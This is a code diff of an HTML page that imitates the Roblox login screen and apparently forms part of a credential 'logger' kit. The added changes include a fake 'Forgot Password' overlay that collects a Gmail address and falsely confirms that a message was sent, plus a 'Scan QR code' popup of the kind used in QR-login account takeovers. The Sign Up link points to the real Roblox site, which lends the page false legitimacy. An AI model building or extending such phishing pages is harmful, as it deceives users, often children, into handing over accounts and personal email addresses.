@@ -15,9 +15,11 @@
         <nav class="navbar">
             <div class="nav-left">
                 <div class="logo">
-                    <div class="logo-square">
-                        <img src="logger.images/robloxLogo.png" alt="Roblox Logo" class="logo-image" style="width:32px; height:32px;">
-                    </div>
+                    <a href="index.html">
+                        <div class="logo-square">
+                            <img src="logger.images/robloxLogo.png" alt="Roblox Logo" class="logo-image" style="width:32px; height:32px;">
+                        </div>
+                    </a>
                 </div>
                 <div class="nav-links">
                     <a href="#" class="nav-link">Charts</a>
@@ -50,14 +52,30 @@
                     <button type="submit" class="login-btn">Log In</button>
                 </form>
 
-                <a href="#" class="forgot-link">Forgot Password or Username?</a>
+                <a href="#" class="forgot-link" id="forgotLink" style="color:#bbb; text-decoration:underline;">Forgot Password or Username?</a>
+                <div id="forgotFrame" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.85); align-items:center; justify-content:center; z-index:999;">
+                    <div style="background:#181818; padding:28px 32px; border-radius:12px; text-align:center; position:relative; box-shadow:0 4px 24px rgba(0,0,0,0.7); color:#eee;">
+                        <span id="closeForgot" style="position:absolute; top:10px; right:16px; cursor:pointer; font-size:22px; color:#bbb;">&times;</span>
+                        <h2 style="color:#fff; margin-bottom:16px;">Enter gmail</h2>
+                        <input type="email" id="forgotEmail" placeholder="Enter your Gmail" style="width:80%; padding:10px; margin:14px 0; border-radius:6px; border:1px solid #333; background:#222; color:#eee;">
+                        <button id="sendForgotBtn" style="padding:10px 22px; background:#222; color:#fff; border:none; border-radius:6px; font-weight:600; cursor:pointer; margin-top:8px;">Send</button>
+                        <div id="forgotMsg" style="margin-top:14px; color:#4caf50; display:none;">A message has been sent to your email.</div>
+                    </div>
+                </div>
+                
 
                 <div class="alternative-options">
-                    <button class="alt-btn">Email Me a One-Time Code</button>
-                    <button class="alt-btn">Use Another Device</button>
+                    <button class="alt-btn" id="qrBtn">Scan QR code</button>
+                    <div id="qrPrompt" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.5); align-items:center; justify-content:center; z-index:999;">
+                        <div style="background:#fff; padding:24px; border-radius:8px; text-align:center; position:relative;">
+                            <span id="closeQr" style="position:absolute; top:8px; right:12px; cursor:pointer; font-size:20px;">&times;</span>
+                            <p>Scan this QR code:</p>
+                            <img id="qrImage" src="" alt="QR Code" style="width:180px; height:180px;">
+                        </div>
+                    </div>
                 </div>
 
-                <p class="signup-text">Don't have an account? <a href="#" class="signup-link">Sign Up</a></p>
+                <p class="signup-text">Don't have an account? <a href="https://www.roblox.com/signup" class="signup-link" target="_blank">Sign Up on Roblox</a></p>
             </div>
         </div>
     </div>
